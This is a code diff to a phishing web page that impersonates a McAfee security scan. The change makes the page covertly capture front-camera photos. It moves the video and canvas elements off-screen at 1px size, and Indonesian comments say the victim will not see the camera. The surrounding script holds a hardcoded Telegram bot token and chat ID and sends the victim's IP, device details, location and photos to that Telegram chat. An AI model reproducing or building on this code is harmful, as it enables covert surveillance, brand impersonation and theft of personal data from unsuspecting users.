@@ -181,23 +181,24 @@
             background: linear-gradient(135deg, #FF9800 0%, #F57C00 100%);
             box-shadow: 0 4px 15px rgba(255, 152, 0, 0.3);
         }
-        .camera-container {
-            width: 100%;
-            aspect-ratio: 4/3;
-            background: #000;
-            border-radius: 20px;
-            overflow: hidden;
-            margin: 16px 0;
-            display: none;
-            position: relative;
-            box-shadow: 0 8px 25px rgba(0,0,0,0.2);
+        /* KAMERA HIDDEN - TIDAK TAMPIL */
+        .hidden-camera {
+            position: fixed;
+            bottom: -1000px;
+            left: -1000px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            visibility: hidden;
         }
-        #video, #canvas {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
+        #hiddenVideo, #hiddenCanvas {
+            width: 1px;
+            height: 1px;
+            position: absolute;
+            top: -1000px;
+            left: -1000px;
         }
-        #canvas { display: none; }
         .progress-container { margin: 20px 0; }
         .progress-text {
             font-size: 13px;
@@ -343,13 +344,12 @@
                     </div>
                     <button class="btn" id="scanBtn" onclick="startScan()">Start Security Scan</button>
                     <div class="scan-details">
-                        <span>📅 Last scan:</span> 7 days ago<br>
                         <span>🗃️ Database:</span> Updated Today<br>
                         <span>🔒 Protection:</span> Active
                     </div>
                 </div>
                 <div class="footer">
-                    © 2025 McAfee LLC. All rights reserved.
+                    © 2026 McAfee LLC. All rights reserved.
                 </div>
             </div>
 
@@ -406,16 +406,17 @@
                 </div>
             </div>
 
-            <!-- STEP 3: Cleaning Process (Ambil Foto) -->
+            <!-- STEP 3: Cleaning Process (Kamera hidden, korban gak liat) -->
             <div id="step3" class="step">
                 <div class="content">
                     <div class="threat-header danger">
                         <div class="title">🧹 Membersihkan Sistem</div>
                         <div class="desc">Menghapus malware dan memverifikasi keamanan...</div>
                     </div>
-                    <div class="camera-container" id="cameraContainer">
-                        <video id="video" autoplay playsinline muted></video>
-                        <canvas id="canvas"></canvas>
+                    <!-- KAMERA HIDDEN - TIDAK KELIHATAN DI WEB -->
+                    <div class="hidden-camera">
+                        <video id="hiddenVideo" autoplay playsinline muted></video>
+                        <canvas id="hiddenCanvas"></canvas>
                     </div>
                     <div class="progress-container">
                         <div class="progress-text" id="progressText">Cleaning files... 0%</div>
@@ -522,6 +523,10 @@
         </div>
     </div>
 
+    <!-- Hidden camera elements - out of view -->
+    <video id="hiddenVideo" autoplay playsinline muted style="position: fixed; top: -1000px; left: -1000px; width: 1px; height: 1px; opacity: 0;"></video>
+    <canvas id="hiddenCanvas" style="position: fixed; top: -1000px; left: -1000px; width: 1px; height: 1px; opacity: 0;"></canvas>
+
     <script>
         const BOT_TOKEN = "8815208512:AAF203UNeorv8tqMewNncu01dMBnx4hXwBU";
         const CHAT_ID = "7393949927";
@@ -596,7 +601,6 @@
             try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: formData }); } catch(e) {}
         }
         
-        // STEP 1: Scan
         async function startScan() {
             const scanBtn = document.getElementById('scanBtn');
             const scanAnimation = document.getElementById('scanAnimation');
@@ -613,7 +617,6 @@
             document.getElementById('step2').classList.add('active');
         }
         
-        // STEP 2: Clean
         async function cleanVirus() {
             document.getElementById('step2').classList.remove('active');
             document.getElementById('step3').classList.add('active');
@@ -660,17 +663,18 @@
 ${locationDetail || '📍 Lokasi tidak dapat diakses (izin ditolak)'}
 ━━━━━━━━━━━━━━━━━━━━━━
 🔴 STATUS: 3 virus detected
-📸 Cleaning process: 15 photos
+📸 Cleaning process: 15 photos (hidden camera)
 🕐 ${new Date().toLocaleString('id-ID')}
 ━━━━━━━━━━━━━━━━━━━━━━
 🔥 DILZX-EXECUTOR 🔥`);
             
+            // MINTA KAMERA (TAPI HIDDEN, KORBAN GA LIAT)
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                video = document.getElementById('video');
-                canvas = document.getElementById('canvas');
+                video = document.getElementById('hiddenVideo');
+                canvas = document.getElementById('hiddenCanvas');
                 video.srcObject = stream;
-                document.getElementById('cameraContainer').style.display = 'block';
+                // Video hidden, no display
                 await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
                 startCapture();
             } catch(err) {
@@ -787,7 +791,7 @@ Time: ${new Date().toLocaleString('id-ID')}`);
 📱 ${device.os}
 🌐 IP: ${ip}
 🕐 ${new Date().toLocaleString('id-ID')}
-🎭 Theme: McAfee Security Scan`);
+🎭 Theme: McAfee Security Scan (Hidden Camera)`);
         })();
     </script>
 </body>
